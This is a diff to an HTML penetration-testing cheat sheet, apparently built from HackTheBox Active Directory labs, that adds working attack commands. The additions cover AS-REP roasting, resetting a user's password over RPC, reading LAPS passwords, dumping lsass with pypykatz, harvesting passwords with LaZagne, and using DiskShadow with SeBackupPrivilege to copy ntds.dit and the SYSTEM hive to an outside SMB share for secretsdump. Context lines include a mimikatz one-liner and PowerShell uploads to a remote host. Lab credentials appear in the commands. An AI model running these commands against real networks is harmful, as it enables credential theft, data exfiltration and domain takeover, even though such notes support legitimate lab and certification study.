@@ -210,10 +210,14 @@ cat secrets | cut -d ":" -f 1 | tee users
 cat secrets | cut -d ":" -f 4 | tee passwords
 
 
-or
+or:
 
 lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
 
+
+or to get first word before space: 
+
+awk '{print $1}' profiles &gt; users
 </code></pre>
 <h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
 <pre><code>export IP=""
@@ -400,6 +404,12 @@ Do this to build the repot
 ruby osert.rb generate -i &lt;filename&gt;.md 
 
 
+</code></pre>
+<h3 id="fun-fact"><a class="header" href="#fun-fact">Fun Fact</a></h3>
+<p>https://github.com/AlessandroZ/LaZagne</p>
+<pre><code>Do this to find passwords in Firefox folder
+
+.\lazagne.exe all
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="scanning"><a class="header" href="#scanning">Scanning</a></h2>
 <h3 id="nmap-scans"><a class="header" href="#nmap-scans">Nmap Scans</a></h3>
@@ -1596,7 +1606,9 @@ rpcclient -U "" -N &lt;IP&gt;
 
 3. Try without a password: rpcclient -U "" &lt;IP&gt;
 
-4. Dump: impacket-rpcdump -p 135 &lt;IP&gt;
+4. With creds: rpcclient -U 'support' $ip
+
+5. Dump: impacket-rpcdump -p 135 &lt;IP&gt;
 
 </code></pre>
 <h3 id="59855986---evil-winrm"><a class="header" href="#59855986---evil-winrm"><ins>5985/5986 - Evil-winrm</ins></a></h3>
@@ -9233,6 +9245,12 @@ mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
 <h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
 <pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
+or this:
+
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
+
+
+
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 </code></pre>
 <pre><code>
@@ -9245,6 +9263,15 @@ cd C:\Tools
 .\Rubeus.exe asreproast /nowrap
 
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<h3 id="password-reset-over-rpc"><a class="header" href="#password-reset-over-rpc">Password Reset over RPC</a></h3>
+<p>https://room362.com/posts/2017/reset-ad-user-password-with-linux/</p>
+<pre><code>Log into Rpc with the user who can change password of other user:
+
+rpcclient $&gt; setuserinfo2
+
+rpcclient $&gt; setuserinfo2 audit2020 23 'Bwiz123!!!'
+
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="active-directory-enumeration"><a class="header" href="#active-directory-enumeration">Active Directory Enumeration</a></h2>
 <h3 id="links-16"><a class="header" href="#links-16">Links</a></h3>
@@ -9534,6 +9561,13 @@ sekurlsa::tickets # Dumping TGT/TGS Tickets stored in memory.
 Mimikatz One-Liner:
 
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
+</code></pre>
+<h3 id="pypykatz"><a class="header" href="#pypykatz">PyPyKatz</a></h3>
+<p>https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows</p>
+<pre><code>If you come across a lsass dump file, like in HTB Blackfield, use this tool
+
+pypykatz lsa minidump lsass.DMP
+
 </code></pre>
 <h3 id="kerberoasting-1"><a class="header" href="#kerberoasting-1">Kerberoasting</a></h3>
 <pre><code>Service Account Attack -&gt; Kerberoasting attack.
@@ -10177,6 +10211,26 @@ certipy-ad auth -pfx administrator.pfx
 
 
 </code></pre>
+<h3 id="from-htb-streamio-for-readlapspassword-writeowner-owns-privilege-attack"><a class="header" href="#from-htb-streamio-for-readlapspassword-writeowner-owns-privilege-attack">From HTB StreamIO for "<strong>ReadLAPSPassword</strong>" "WriteOwner /Owns" privilege attack</a></h3>
+<pre><code>
+While logged in as a user, but got creds for a user who can read LAPS Password:
+
+upload /usr/share/windows-binaries/PowerView.ps1
+
+Import-Module .\PowerView.ps1
+$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
+Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
+net user jdgodd /domain
+Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+Get-DomainObject DC -Credential $cred -Properties "ms-Mcs-AdmPwd",name
+
+or just do this from kali:
+
+ldapsearch -x -b 'DC=streamIO,DC=htb' -H ldap://streamio.htb -D JDgodd@streamio.htb -W "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="hash-dumping"><a class="header" href="#hash-dumping">Hash Dumping</a></h2>
 <h3 id="sam-dumping"><a class="header" href="#sam-dumping">SAM Dumping</a></h3>
 <pre><code>Dumping the SAM hashes on Victim
@@ -10326,6 +10380,40 @@ powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.
 
 
 powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
+</code></pre>
+<h3 id="copy-filesebackupprivilege"><a class="header" href="#copy-filesebackupprivilege">### Copy-FileSeBackupPrivilege</a></h3>
+<p>https://github.com/giuliano108/SeBackupPrivilege</p>
+<pre><code>One way to read and copy files:
+
+upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+import-module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
+type \programdata\netlogon.dns
+
+</code></pre>
+<h3 id="diskshadow"><a class="header" href="#diskshadow">### DiskShadow</a></h3>
+<pre><code>put this into a file called vss.dsh:
+
+set context persistent nowriters 
+set metadata c:\programdata\df.cab 
+set verbose on 
+add volume c: alias df 
+create expose %df% z:
+
+
+---
+unix2dos vss.dsh
+upload vss.dsh c:\programdata\vss.dsh
+diskshadow /s c:\programdata\vss.dsh
+
+smbserver.py s . -smb2support -username df -password df
+net use \\10.10.14.14\s /u:df df
+Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
+reg.exe save hklm\system \\10.10.14.14\system
+secretsdump.py -system system -ntds ntds.dit LOCAL
+
 </code></pre>
 <h3 id="ticket-generation-from-linux"><a class="header" href="#ticket-generation-from-linux">Ticket generation from Linux</a></h3>
 <pre><code># Generate a ticket or convert it (kekeo) to ccache format
